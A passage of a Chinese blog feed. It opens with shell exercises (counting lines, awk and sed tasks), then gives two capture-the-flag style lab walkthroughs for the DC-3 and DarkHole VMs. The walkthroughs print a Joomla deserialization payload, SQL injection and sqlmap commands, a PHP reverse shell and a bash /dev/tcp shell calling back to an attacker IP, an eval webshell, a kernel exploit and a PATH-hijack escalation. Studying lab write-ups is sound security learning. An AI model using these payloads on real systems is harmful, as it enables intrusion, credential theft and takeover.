start="4"><li>修改Bash的提示字符串(usernamechostname:~s)</li></ol><p>​当我们打开终端或是运行shell时，会看到类似于user@hostname:&#x2F;home&#x2F;s的提示字符串。不同的GNUIimux发布版中的提示字符串及颜色各不相同。我们可以利用ps1环境变量来定义主提示字符串。默认的提示字符串是在文件~&#x2F;.bashrc中的某一行设置的。<br>​还有一些特殊的字符可以扩展成系统参数。例如:\u可以扩展为用户名，\h可以扩展为主机名，而\w可以扩展为当前工作目录。</p><h1 id="牛客shell练习"><a href="#牛客shell练习" class="headerlink" title="牛客shell练习"></a>牛客shell练习</h1><p>编写一个shell脚本以输出一个文本文件nowcoder.txt中的行数<br>示例:<br>假设 nowcoder.txt 内容如下：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="type">int</span> b = <span class="number">100</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;a + b:&quot;</span> &lt;&lt; a + b &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>你的脚本应当输出：<br>9</p><h2 id="示例1"><a href="#示例1" class="headerlink" title="示例1"></a>示例1</h2><p>编写一个shell脚本以输出一个文本文件nowcoder.txt中的行数<br>示例:<br>假设 nowcoder.txt 内容如下：</p><p>输入：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="type">int</span> b = <span class="number">100</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;a + b:&quot;</span> &lt;&lt; a + b &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">9</span><br></pre></td></tr></table></figure><p>题解：</p><p>wc命令</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat nowcoder.txt | wc -l</span><br><span class="line">wc -l &lt; nowcoder.txt</span><br><span class="line">wc -l nowcoder.txt | gawk &#x27;&#123;print $1&#125;&#x27;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[youzipii@localhost ~]$ cat test1.c | wc -l</span><br><span class="line">9</span><br><span class="line">[youzipii@localhost ~]$ wc -l &lt; test1.c</span><br><span class="line">9</span><br><span class="line">[youzipii@localhost ~]$ wc -l test1.c | gawk &#x27;&#123;print $1&#125;&#x27;</span><br><span class="line">9</span><br></pre></td></tr></table></figure><p>awk命令</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">awk &#x27;&#123;print NR&#125;&#x27; ./nowcoder.txt |tail -n1</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[youzipii@localhost ~]$ awk &#x27;&#123;print NR&#125;&#x27; ./test1.c |tail -n1</span><br><span class="line">9</span><br></pre></td></tr></table></figure><p>awk 本身就可以只打印最后一行，因此一个 awk 脚本也可以搞定</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[youzipii@localhost ~]$ awk &#x27;END&#123;print NR&#125;&#x27; ./test1.c</span><br><span class="line">9</span><br></pre></td></tr></table></figure><p>使用 grep 搜索 <code>&quot;&quot;</code>，然后利用 grep 自带的功能统计行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[youzipii@localhost ~]$ grep -c &quot;&quot; ./test1.c</span><br><span class="line">9</span><br></pre></td></tr></table></figure><p>Sed</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[youzipii@localhost ~]$ sed -n &#x27;$=&#x27; ./test1.c</span><br><span class="line">9</span><br></pre></td></tr></table></figure><h2 id="打印文件的最后5行"><a href="#打印文件的最后5行" class="headerlink" title="打印文件的最后5行"></a><strong>打印文件的最后5行</strong></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tail -n 5 test1.c</span><br></pre></td></tr></table></figure><h2 id="SHELL3-输出-0-到-500-中-7-的倍数"><a href="#SHELL3-输出-0-到-500-中-7-的倍数" class="headerlink" title="SHELL3 输出 0 到 500 中 7 的倍数"></a><strong>SHELL3</strong> <strong>输出 0 到 500 中 7 的倍数</strong></h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">! /bin/bash</span></span><br><span class="line">seq 0 7 5</span><br></pre></td></tr></table></figure><p>seq 用于生成从一个数到另一个数之间的所有整数。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line">for i in &#123;0..500&#125;</span><br><span class="line"> do </span><br><span class="line"> if [[ i%7 -eq 0 ]];then</span><br><span class="line"> echo $i</span><br><span class="line"> fi</span><br><span class="line"> done</span><br></pre></td></tr></table></figure><h2 id="SHELL4-输出第5行的内容"><a href="#SHELL4-输出第5行的内容" class="headerlink" title="SHELL4 输出第5行的内容"></a><strong>SHELL4</strong> <strong>输出第5行的内容</strong></h2><p>编写一个bash脚本以输出一个文本文件nowcoder.txt中第5行的内容。</p><p>示例:<br>假设 nowcoder.txt 内容如下：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">welcome</span><br><span class="line">to</span><br><span class="line">nowcoder</span><br><span class="line">this</span><br><span class="line">is</span><br><span class="line">shell</span><br><span class="line">code</span><br></pre></td></tr></table></figure><p>你的脚本应当输出：<br>is</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">awk &#x27;NR==5&#123;print $0&#125;&#x27; test.txt</span><br></pre></td></tr></table></figure><h2 id="SHELL5-打印空行的行号"><a href="#SHELL5-打印空行的行号" class="headerlink" title="SHELL5 打印空行的行号"></a><strong>SHELL5</strong> <strong>打印空行的行号</strong></h2><h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>编写一个shell脚本以输出一个文本文件nowcoder.txt中空行的行号（空行可能连续，从1开始输出）</p><p>示例:<br>假设 nowcoder.txt 内容如下：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">a</span><br><span class="line">b</span><br><span class="line"></span><br><span class="line">c</span><br><span class="line"></span><br><span class="line">d</span><br><span class="line"></span><br><span class="line">e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f</span><br></pre></td></tr></table></figure><p>你的脚本应当输出：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">3</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line"><span class="number">7</span></span><br><span class="line"><span class="number">9</span></span><br><span class="line"><span class="number">10</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">awk &#x27;/^\s*$/ &#123;print NR&#125;&#x27; test.txt</span><br></pre></td></tr></table></figure><p><code>/^\s*$/</code> 是一个正则表达式，用于匹配特定的字符串模式。在这个正则表达式中：</p><ul><li><code>^</code> 表示匹配字符串的开始。</li><li><code>\s</code> 是一个特殊字符，用于匹配任何空白字符，包括空格、制表符、换页符等。</li><li><code>*</code> 表示前面的字符（在这里是 <code>\s</code>）可以出现零次或多次。</li><li><code>$</code> 表示匹配字符串的结束。</li></ul><p>因此，<code>/^\s*$/</code> 匹配的是一个字符串，这个字符串只包含空白字符（或者根本没有字符，即空字符串）。例如：</p><ul><li>“”（空字符串）</li><li>“ “（一个空格）</li><li>“\t”（一个制表符）</li><li>“ \t\n”（空格、制表符和换行符的组合）</li></ul><p>但是，它不会匹配包含任何非空白字符的字符串，如 “hello” 或 “123”。</p><h2 id="SHELL6-去掉空行"><a href="#SHELL6-去掉空行" class="headerlink" title="SHELL6 去掉空行"></a><strong>SHELL6</strong> <strong>去掉空行</strong></h2><p>写一个 bash脚本以去掉一个文本文件nowcoder.txt中的空行<br>示例:<br>假设nowcoder.txt 内容如下：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">abc</span><br><span class="line"></span><br><span class="line"><span class="number">567</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">aaa</span><br><span class="line">bbb</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ccc</span><br></pre></td></tr></table></figure><p>你的脚本应当输出：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">abc</span><br><span class="line"><span class="number">567</span></span><br><span class="line">aaa</span><br><span class="line">bbb</span><br><span class="line">ccc</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">awk NF</span><br><span class="line">sed &#x27;/^\s*$/d&#x27; nowcoder.txt</span><br></pre></td></tr></table></figure><h2 id="SHELL7-打印字母数小于8的单词"><a href="#SHELL7-打印字母数小于8的单词" class="headerlink" title="SHELL7 打印字母数小于8的单词"></a><strong>SHELL7</strong> <strong>打印字母数小于8的单词</strong></h2><p>写一个bash脚本以统计一个文本文件nowcoder.txt中字母数小于8的单词。<br>示例:<br>假设 nowcoder.txt 内容如下：</p><p>how they are implemented and applied in computer</p><p>你的脚本应当输出：<br>how<br>they<br>are</p><p>and</p><p>applied</p><p>in</p><p>说明:<br>不用担心你输出的空格以及换行的问题</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span>  </span><br><span class="line"><span class="meta prompt_">  </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">假设单词由空白字符（空格、制表符、换行符等）分隔</span>  </span><br><span class="line">awk &#x27;&#123;  </span><br><span class="line">    for (i = 1; i &lt;= NF; i++) &#123;  </span><br><span class="line">        # 使用length函数获取字段长度（即单词长度），并检查是否小于8  </span><br><span class="line">        if (length($i) &lt; 8) &#123;  </span><br><span class="line">            print $i  </span><br><span class="line">            # 如果你只是想计数而不是打印单词，可以取消注释以下行，并注释掉print $i  </span><br><span class="line">            # count++  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    # 如果你在计数，可以在这里打印总数  </span><br><span class="line">    # print &quot;Total count:&quot;, count  </span><br><span class="line">    # count = 0 # 重置计数器（如果需要处理多个文件或多次调用）  </span><br><span class="line">&#125;&#x27; nowcoder.txt  </span><br><span class="line"><span class="meta prompt_">  </span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">如果你要计数并打印总数，可以稍微修改上面的脚本并取消注释相关行</span></span><br></pre></td></tr></table></figure><h2 id="SHELL8-统计所有进程占用内存百分比的和"><a href="#SHELL8-统计所有进程占用内存百分比的和" class="headerlink" title="SHELL8 统计所有进程占用内存百分比的和"></a><strong>SHELL8</strong> <strong>统计所有进程占用内存百分比的和</strong></h2>]]></content>
      
      
      
        <tags>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC-3</title>
      <link href="/2024/04/10/DC-3/"/>
      <url>/2024/04/10/DC-3/</url>
      
        <content type="html"><![CDATA[<h1 id="DC-3"><a href="#DC-3" class="headerlink" title="DC-3"></a>DC-3</h1><p><strong>kali:192.168.174.137</strong></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><p>nmap -sn ip&#x2F;24 发现主机</p><p><img src="/../image/image-20240410182529933.png" alt="image-20240410182529933"></p><p><strong>获得主机ip：192.168.174.150</strong></p><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>nmap -sS -sV -T4 -n -p- 192.168.174.150</p><p>参数解释：</p><ol><li><strong>-sS</strong>: 使用 SYN 扫描</li><li><strong>-sV</strong>: 探测开放端口上的服务版本信息。这个选项会尝试确定目标端口上运行的具体服务版本，从而可能暴露更多的关于目标系统的信息。</li><li><strong>-T4</strong>: 设置扫描的时间模板为 4。<code>nmap</code> 提供了不同的时间模板，从 0（最慢，最不容易被检测）到 5（最快，但最容易被防火墙或入侵检测系统检测到）。</li><li><strong>-n</strong>: 不进行 DNS 解析。这可以加快扫描速度</li><li><strong>-p-</strong>: 扫描所有端口。</li></ol><p><img src="/../image/image-20240410182952717.png" alt="image-20240410182952717"></p><p>可以看到开放了1个端口</p><p>80-http apache 2.4.18</p><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p><img src="/../image/image-20240410183030982.png" alt="image-20240410183030982"></p><p>访问的同时，在后台进行目录扫描,看一下主页的信息,可以发现这次只有一个flag，且需要进入root权限获取</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这一次，只有一面旗帜，一个入口，没有线索。</span><br><span class="line">要获得该标志，显然必须获得根权限。</span><br><span class="line">如何成为root取决于你自己，当然也取决于系统。</span><br><span class="line">祝你好运——我希望你喜欢这个小挑战。：-）</span><br></pre></td></tr></table></figure><p>目录扫描到一个<a href="http://192.168.174.150/administrator/%EF%BC%8C%E8%AE%BF%E9%97%AE%E5%90%8E%E5%8F%91%E7%8E%B0%E4%B8%80%E6%A0%B7%E6%98%AF%E4%B8%80%E4%B8%AA%E7%99%BB%E9%99%86%E7%95%8C%E9%9D%A2%EF%BC%8C%E4%B8%94%E5%BF%98%E8%AE%B0%E5%AF%86%E7%A0%81%E7%AD%89%E9%87%8D%E5%AE%9A%E5%90%91%E4%B9%9F%E6%98%AF%E6%B2%A1%E5%B7%AE%E3%80%82">http://192.168.174.150/administrator/，访问后发现一样是一个登陆界面，且忘记密码等重定向也是没差。</a></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p><img src="/../image/image-20240410190923148.png" alt="image-20240410190923148"></p><p>但界面上的Joomla！倒是提醒我们可以去看看有没有存在的漏洞，一艘还真有<a href="https://blog.csdn.net/smli_ng/article/details/115799954">Joomla 漏洞总结</a>我们先用<a href="https://blog.csdn.net/smli_ng/article/details/115799954#t2">CVE-2015-8562 反序列化漏洞</a>试试，就按着文章里的教程实验</p><p><strong>首先我们不带User-Agent头，先访问一次目标主页，记下服务端返回的Cookie</strong></p><p><img src="/../image/image-20240410192928091.png" alt="image-20240410192928091"></p><p><strong>然后将User-Agent设置为以下内容，然后cookie设置为才刚目标网站返回的内容。</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">123&#125;__test|O:21:&quot;JDatabaseDriverMysqli&quot;:3:&#123;s:4:&quot;\0\0\0a&quot;;O:17:&quot;JSimplepieFactory&quot;:0:</span><br><span class="line">&#123;&#125;s:21:&quot;\0\0\0disconnectHandlers&quot;;a:1:&#123;i:0;a:2:&#123;i:0;O:9:&quot;SimplePie&quot;:5:</span><br><span class="line">&#123;s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:</span><br><span class="line">&#123;&#125;s:5:&quot;cache&quot;;b:1;s:19:&quot;cache_name_function&quot;;s:6:&quot;assert&quot;;s:10:&quot;javascript&quot;;i:9999;s:8:&quot;fee</span><br><span class="line">d_url&quot;;s:37:&quot;phpinfo();JFactory::getConfig();exit;&quot;;&#125;i:1;s:4:&quot;init&quot;;&#125;&#125;s:13:&quot;\0\0\0connectio</span><br><span class="line">n&quot;;i:1;&#125;</span><br></pre></td></tr></table></figure><p>这一种好像不行，不懂是不是这个版本修复了，换一种方法试试</p><h4 id="CVE-2017-8917-SQL注入漏洞"><a href="#CVE-2017-8917-SQL注入漏洞" class="headerlink" title="CVE-2017-8917 SQL注入漏洞"></a>CVE-2017-8917 SQL注入漏洞</h4><p>构造payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(0x23,concat(1,database()),1)</span><br></pre></td></tr></table></figure><p>访问主页<img src="/../image/image-20240410194637343.png" alt="image-20240410194637343"></p><p>发现可以使用，上sqlmap试试</p><p>python sqlmap.py -u “<a href="http://192.168.174.150/?option=com_fields&amp;view=fields&amp;layout=modal&amp;list%5Bfullordering%5D=*&quot;">http://192.168.174.150/?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=*&quot;</a> –dbs</p><p>&#x2F;&#x2F;*表示注入位置<br>&#x2F;&#x2F;查询所有数据库<br><img src="/../image/image-20240410195907716.png" alt="image-20240410195907716"></p><p><img src="/../image/image-20240410195949663.png" alt="image-20240410195949663"></p><p>python sqlmap.py -u “<a href="http://192.168.174.150/?option=com_fields&amp;view=fields&amp;layout=modal&amp;list%5Bfullordering%5D=*&quot;">http://192.168.174.150/?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=*&quot;</a> -D “joomladb” -T “#__users” –columns<br>查询users表内的列名,选择sqlmap自带的默认的字典即可</p><p><img src="/../image/image-20240410200501591.png" alt="image-20240410200501591"></p><p>python sqlmap.py -u “<a href="http://192.168.174.150/?option=com_fields&amp;view=fields&amp;layout=modal&amp;list%5Bfullordering%5D=*&quot;">http://192.168.174.150/?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=*&quot;</a> -D “joomladb” -T “#__users” -C “username,password” –dump<br>&#x2F;&#x2F;读取指定字段内容</p><p><img src="/../image/image-20240410200627349.png" alt="image-20240410200627349"></p><p>密码为md5加密 可以使用kali内的john 解密</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">touch admin.txt   #创建文件</span><br><span class="line">vi admin.txt      #编辑</span><br><span class="line">john admin.txt    #破解</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240410201249865.png" alt="image-20240410201249865"></p><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><blockquote><p>通过对后台的各种查询，发现Extensions-&gt;Templates里面的模板可以执行PHP脚本</p><p>这个不看下攻略没用过的话还挺难找</p></blockquote><p><img src="/../image/image-20240410202148182.png" alt="image-20240410202148182"></p><p><img src="/../image/image-20240410202233083.png" alt="image-20240410202233083"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//当系统没有禁用proc_popen的时候，我们是可以借助proc_popen轻松反弹这样的一个shell的。</span></span><br><span class="line"><span class="variable">$sock</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="string">&quot;192.168.174.137&quot;</span>, <span class="string">&quot;5555&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$descriptorspec</span> = <span class="keyword">array</span>(</span><br><span class="line"></span><br><span class="line">        <span class="number">0</span> =&gt; <span class="variable">$sock</span>,</span><br><span class="line"></span><br><span class="line">        <span class="number">1</span> =&gt; <span class="variable">$sock</span>,</span><br><span class="line"></span><br><span class="line">        <span class="number">2</span> =&gt; <span class="variable">$sock</span></span><br><span class="line"></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$process</span> = <span class="title function_ invoke__">proc_open</span>(<span class="string">&#x27;/bin/sh&#x27;</span>, <span class="variable">$descriptorspec</span>, <span class="variable">$pipes</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">proc_close</span>(<span class="variable">$process</span>);</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240410202545098.png" alt="image-20240410202545098"></p><p>之后保存访问<a href="http://192.168.174.150/index.php%EF%BC%8Ckali%E7%94%A8nc%E6%8E%A5%E6%94%B6%E5%8F%8D%E5%BC%B9">http://192.168.174.150/index.php，kali用nc接收反弹</a></p><p><img src="/../image/image-20240410202616938.png" alt="image-20240410202616938"></p><p>接下来就是提权了，先转化一下终端</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240410202723341.png" alt="image-20240410202723341"></p><p>find &#x2F; -user root -perm 4000 -print &gt;&#x2F;dev&#x2F;null</p><p>看了下没有适合利用suid提权的命令，找了下home目录，dc3也是空的，但发现个隐藏文件.sudo_admin_successfule.不懂后面有没有用，继续跟着教程看看</p><p>另外开一个终端去漏洞库查找有没有相关漏洞</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/*release#查看发行版信息</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240410210247798.png" alt="image-20240410210247798"></p><p>是ubuntu 16.04</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /proc/version  #查看内核版本的全部信息</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240410210324583.png" alt="image-20240410210324583"></p><p>内核时Linux 4.4.0，查看kali本地漏洞库里面的exp。</p><p><img src="/../image/image-20240410210703519.png" alt="image-20240410210703519"></p><p>对应得版本要都试试，我这里因为是直接看攻略所以 就直接用39772.txt</p><p>查看exp</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /usr/share/exploitdb/exploits/linux/local/39772.txt</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240410210845350.png" alt="image-20240410210845350"></p><p>可以看到有下载地址，我们下载下面那个zip文件wget就行</p><p><img src="/../image/image-20240410210954802.png" alt="image-20240410210954802"></p><p>然后用python搭建一个简单服务器</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -m http.server 8081</span><br></pre></td></tr></table></figure><p>回到反弹回来得shell，wget文件即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://192.168.174.137:8081/39772.zip</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240410211555816.png" alt="image-20240410211555816"></p><p>解压exp</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unzip 39772.zip</span><br></pre></td></tr></table></figure><p><em>进入39772</em> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd 39772</span><br></pre></td></tr></table></figure><p>解压缩exploit.tar</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -xvf exploit.tar</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240410212043213.png" alt="image-20240410212043213"></p><p>进入 ebpf_mapfd_doubleput_exploit 运行exp</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./compile.sh</span><br><span class="line">./doubleput</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240410212800584.png" alt="image-20240410212800584"></p><p>过一会就会变成root用户了，还挺神奇。</p><p><img src="/../image/image-20240410212849338.png" alt="image-20240410212849338"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DarkHole</title>
      <link href="/2024/04/07/DarkHole/"/>
      <url>/2024/04/07/DarkHole/</url>
      
        <content type="html"><![CDATA[<h1 id="DockerHole"><a href="#DockerHole" class="headerlink" title="DockerHole"></a>DockerHole</h1><p><strong>kali:192.168.174.137</strong></p><p><strong>给靶机生成个物理地址00:50:56:23:4C:10</strong></p><p><img src="/../image/image-20240407163518855.png" alt="image-20240407163518855"></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><p>arp-scan -l 发现主机</p><p><img src="/../image/image-20240407163800693.png" alt="image-20240407163800693"></p><p><strong>获得主机ip：192.168.174.149</strong></p><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>nmap -sS -sV -T4 -n -p- 192.168.174.149</p><p>参数解释：</p><ol><li><strong>-sS</strong>: 使用 SYN 扫描</li><li><strong>-sV</strong>: 探测开放端口上的服务版本信息。这个选项会尝试确定目标端口上运行的具体服务版本，从而可能暴露更多的关于目标系统的信息。</li><li><strong>-T4</strong>: 设置扫描的时间模板为 4。<code>nmap</code> 提供了不同的时间模板，从 0（最慢，最不容易被检测）到 5（最快，但最容易被防火墙或入侵检测系统检测到）。</li><li><strong>-n</strong>: 不进行 DNS 解析。这可以加快扫描速度</li><li><strong>-p-</strong>: 扫描所有端口。</li></ol><p><img src="/../image/image-20240407164135872.png" alt="image-20240407164135872"></p><p>可以看到开放了两个端口</p><p>22-ssh Openssh</p><p>80-http apache 2.4.41</p><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p><img src="/../image/image-20240407164518989.png" alt="image-20240407164518989"></p><p>访问的同时，在后台进行目录扫描</p><p>可以获得<a href="http://192.168.174.149/upload/%E6%8E%A8%E6%B5%8B%E5%8F%AF%E8%83%BD%E6%9C%89%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%EF%BC%8C%E7%87%83%E7%81%AB%E5%8F%B3%E4%B8%8A%E8%A7%92%E6%9C%89%E4%B8%80%E4%B8%AA%E7%99%BB%E9%99%86%E7%95%8C%E9%9D%A2%EF%BC%8C%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8%E5%BC%B1%E5%8F%A3%E4%BB%A4%EF%BC%8Csql%E6%B3%A8%E5%85%A5%E7%AD%89%E3%80%82">http://192.168.174.149/upload/推测可能有文件上传漏洞，燃火右上角有一个登陆界面，可能存在弱口令，sql注入等。</a></p><h3 id="登陆界面"><a href="#登陆界面" class="headerlink" title="登陆界面"></a>登陆界面</h3><p><img src="/../image/image-20240407172106009.png" alt="image-20240407172106009"></p><p>简单尝试admin:admind登陆看下返回信息有没有提示，发现没有，去注册一个试试</p><p><img src="/../image/image-20240407172304098.png" alt="image-20240407172304098"></p><p>发现admin用户已经被注册了，后台开一个bp先爆破着，自己注册一个账号登陆上去看看有什么信息</p><p><img src="/../image/image-20240407173200797.png" alt="image-20240407173200797"></p><p><img src="/../image/image-20240407173225389.png" alt="image-20240407173225389"></p><p>可以看到，注册完有自己的信息和修改密码的功能且网址中还有个id&#x3D;2，推测id&#x3D;1为admin用户的界面，修改试下能不能访问</p><p><img src="/../image/image-20240407173325093.png" alt="image-20240407173325093"></p><p>试试抓包能不能直接修改admin的密码</p><p><img src="/../image/image-20240407173402240.png" alt="image-20240407173402240"></p><p>改成1后试试用admin登陆，可以看到登陆成功</p><p><img src="/../image/image-20240407173449466.png" alt="image-20240407173449466"></p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>登陆上管理员界面后发现多了个文件上传的地方，结合前面的目录，可能 存在文件上传漏洞，先试试上传自己写的一句话木马</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CMD&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240407184027696.png" alt="image-20240407184027696"></p><p>可以发现只允许上传jpg,png,gif这样的图片，试试绕过方法</p><p><img src="/../image/image-20240407184400185.png" alt="image-20240407184400185"></p><p>先试试修改类型</p><p><img src="/../image/image-20240407184513629.png" alt="image-20240407184513629"></p><p>上传一张正常的图片试试</p><p><img src="/../image/image-20240407185347279.png" alt="image-20240407185347279"></p><p>发现文件路径，访问一下也确实能出现图片</p><p><img src="/../image/image-20240407185413474.png" alt="image-20240407185413474"></p><p>修改下后缀试试，pphphp绕过了</p><p><img src="/../image/image-20240407190606652.png" alt="image-20240407190606652"></p><p>但文件并没有以php的形式保留下来，作了个图片马，也不行，试试别的方法，phtml和pchar可以</p><p><img src="/../image/image-20240407191935091.png" alt="image-20240407191935091"></p><p><img src="/../image/image-20240407191959674.png" alt="image-20240407191959674"></p><p>下面就是寻找flag的提取过程了</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>在获取到shell的基础上，我么需要反弹shell</p><p>kali：nv -lvvp6666</p><p>shell: bash -c ‘bash -i  &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.174.137&#x2F;6666  0&gt;&amp;1’</p><p><img src="/../image/image-20240407194457299.png" alt="image-20240407194457299"></p><h3 id="sudo-root提权"><a href="#sudo-root提权" class="headerlink" title="sudo root提权"></a>sudo root提权</h3><p>cat &#x2F;etc&#x2F;passwd 发现了john用户 在家目录下面发现了一个toto文件执行发现和id一样的功能</p><p><img src="/../image/image-20240407200300090.png" alt="image-20240407200300090"></p><p><img src="/../image/image-20240407200340646.png" alt="image-20240407200340646"></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> tmp</span><br><span class="line"><span class="built_in">touch</span> <span class="built_in">id</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;/bin/bash&quot;</span> &gt; <span class="built_in">id</span></span><br><span class="line"><span class="built_in">chmod</span> 777 <span class="built_in">id</span></span><br><span class="line"><span class="built_in">export</span> PATH=/tmp;<span class="variable">$PATH</span></span><br><span class="line"><span class="built_in">cd</span> /home/john</span><br><span class="line">./toto</span><br><span class="line"><span class="built_in">cat</span> user.txt</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240407201525851.png" alt="image-20240407201525851"></p><p>然后现在我们再次执行就可以查看账号和密码文件了 直接使用<code>SSH</code>进行连接：<code>john/root123</code></p><p><img src="/../image/image-20240407201629653.png" 